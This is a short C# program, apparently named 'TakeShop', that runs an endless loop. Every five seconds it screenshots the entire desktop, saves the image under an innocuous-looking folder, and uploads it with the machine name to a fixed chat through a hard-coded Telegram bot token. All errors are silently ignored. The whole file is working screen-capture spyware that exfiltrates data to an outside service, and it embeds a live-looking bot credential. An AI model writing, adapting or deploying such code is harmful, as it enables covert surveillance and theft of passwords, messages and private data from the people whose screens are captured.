using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Telegram.Bot;

namespace TakeShop
{
    class Program
    {
        static void Main(string[] args)
        {
            aaaa().Wait();
        }

        static async Task aaaa()
        {
            TelegramBotClient telegramBotClient = new TelegramBotClient("618455177:AAGy4lkSVAYzghUVulPr_oNhSZdBL5VCUsY");

            decimal i = 0;

            while (true)
            {
                try
                {
                    Thread.Sleep(5000);

                    Rectangle bounds = Screen.GetBounds(Point.Empty);
                    using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                    {
                        using (Graphics g = Graphics.FromImage(bitmap))
                        {
                            g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                        }
                        bitmap.Save(@"C:\Intel\abc123.jpg", ImageFormat.Jpeg);

                        using (Stream stream = File.OpenRead(@"C:\Intel\abc123.jpg"))
                        {
                            await telegramBotClient.SendPhotoAsync(13707657, stream, $"MachineName: {Environment.MachineName}\nIteración: {++i:n2}\nFecha: {DateTime.UtcNow.AddHours(-5):yyyy-MM-dd HH:mm:ss}");
                        }
                    }
                }
                catch (Exception)
                {

                }
            }
        }

    }
}
